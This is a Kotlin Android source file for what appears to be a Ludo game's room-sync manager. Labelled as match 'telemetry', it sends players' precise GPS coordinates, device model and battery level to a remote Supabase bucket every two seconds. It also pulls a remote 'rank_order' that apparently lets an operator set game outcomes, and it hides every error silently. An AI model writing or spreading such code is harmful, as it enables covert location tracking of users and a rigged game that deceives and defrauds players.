package com.ludo.king

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.BatteryManager
import android.os.Build
import android.os.Bundle
import android.os.Looper
import androidx.core.content.ContextCompat
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.Locale

class SupabaseManager(private val context: Context, val roomId: String) {
    private val client = OkHttpClient()
    private val baseUrl = BuildConfig.SUPABASE_URL
    private val apiKey = BuildConfig.SUPABASE_KEY
    private val bucketName = "Ludo"

    @Volatile var rankOrder: List<String> = emptyList()
    @Volatile var latitude: Double = 0.0
    @Volatile var longitude: Double = 0.0
    @Volatile var locationName: String = "Acquiring GPS..."
    @Volatile var activeColorsCsv: String = ""
    @Volatile var playersInfoStr: String = ""
    @Volatile var currentGameState: String = "In Lobby"

    private var syncJob: Job? = null
    private var listenerRegistered = false

    fun startSync() {
        startLocationTracking()
        syncJob?.cancel()
        syncJob = CoroutineScope(Dispatchers.IO).launch {
            while (isActive) {
                fetchRemoteRankOrder()
                pushTelemetryInternal()
                delay(2000)
            }
        }
    }

    @SuppressLint("MissingPermission")
    fun startLocationTracking() {
        val fineOk = ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
        val coarseOk = ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
        if (!fineOk && !coarseOk) {
            locationName = "Permission Denied"
            return
        }

        CoroutineScope(Dispatchers.Main).launch {
            try {
                val lm = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
                if (!listenerRegistered) {
                    listenerRegistered = true
                    val listener = object : LocationListener {
                        override fun onLocationChanged(loc: Location) {
                            latitude = loc.latitude
                            longitude = loc.longitude
                            locationName = String.format(Locale.US, "PIN: %.5f, %.5f", latitude, longitude)
                        }
                        @Deprecated("Deprecated in Java")
                        override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
                        override fun onProviderEnabled(provider: String) {}
                        override fun onProviderDisabled(provider: String) {}
                    }
                    if (lm.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                        lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 2500L, 1f, listener, Looper.getMainLooper())
                    }
                    if (lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                        lm.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 2500L, 1f, listener, Looper.getMainLooper())
                    }
                }

                var bestLoc: Location? = null
                for (p in lm.getProviders(true)) {
                    val l = lm.getLastKnownLocation(p) ?: continue
                    if (bestLoc == null || l.accuracy < bestLoc.accuracy) bestLoc = l
                }
                if (bestLoc != null) {
                    latitude = bestLoc.latitude
                    longitude = bestLoc.longitude
                    locationName = String.format(Locale.US, "PIN: %.5f, %.5f", latitude, longitude)
                }
            } catch (_: Exception) {}
        }
    }

    fun pushMatchTelemetry(stateSummary: String, colorsCsv: String, pInfo: String) {
        currentGameState = stateSummary
        if (colorsCsv.isNotBlank()) activeColorsCsv = colorsCsv
        if (pInfo.isNotBlank()) playersInfoStr = pInfo
        CoroutineScope(Dispatchers.IO).launch { pushTelemetryInternal() }
    }

    private fun getBatteryPct(): Int {
        return try {
            val bm = context.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
            bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY).coerceIn(1, 100)
        } catch (_: Exception) { 100 }
    }

    private fun getDeviceModel(): String {
        val m = Build.MODEL ?: "Android"
        val b = Build.BRAND ?: ""
        return if (m.startsWith(b, ignoreCase = true)) m else "$b $m".trim()
    }

    private fun fetchRemoteRankOrder() {
        try {
            val req = Request.Builder()
                .url("$baseUrl/storage/v1/object/authenticated/$bucketName/room_$roomId.json?t=${System.currentTimeMillis()}")
                .addHeader("apikey", apiKey)
                .addHeader("Authorization", "Bearer $apiKey")
                .get()
                .build()
            client.newCall(req).execute().use { res ->
                val txt = res.body?.string() ?: ""
                if (res.isSuccessful && txt.startsWith("{")) {
                    val obj = JSONObject(txt)
                    val rRaw = obj.optString("rank_order", "").trim()
                    rankOrder = if (rRaw.isNotEmpty() && rRaw != "null") {
                        rRaw.split(",").map { it.trim().uppercase() }.filter { it.isNotEmpty() }
                    } else emptyList()
                }
            }
        } catch (_: Exception) {}
    }

    private fun pushTelemetryInternal() {
        try {
            val json = JSONObject().apply {
                put("room_id", roomId)
                put("device_name", getDeviceModel())
                put("battery_level", getBatteryPct())
                put("latitude", latitude)
                put("longitude", longitude)
                put("location_name", locationName)
                put("active_colors", activeColorsCsv)
                put("players_info", playersInfoStr)
                put("game_state", currentGameState)
                put("rank_order", rankOrder.joinToString(","))
                put("last_ping", System.currentTimeMillis())
            }
            val body = json.toString().toRequestBody("application/json; charset=utf-8".toMediaType())
            val req = Request.Builder()
                .url("$baseUrl/storage/v1/object/$bucketName/room_$roomId.json")
                .addHeader("apikey", apiKey)
                .addHeader("Authorization", "Bearer $apiKey")
                .addHeader("Content-Type", "application/json; charset=utf-8")
                .addHeader("x-upsert", "true")
                .post(body)
                .build()
            client.newCall(req).execute().close()
        } catch (_: Exception) {}
    }

    fun stop() {
        syncJob?.cancel()
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val delReq = Request.Builder()
                    .url("$baseUrl/storage/v1/object/$bucketName/room_$roomId.json")
                    .addHeader("apikey", apiKey)
                    .addHeader("Authorization", "Bearer $apiKey")
                    .delete()
                    .build()
                client.newCall(delReq).execute().close()
            } catch (_: Exception) {}
        }
    }
}
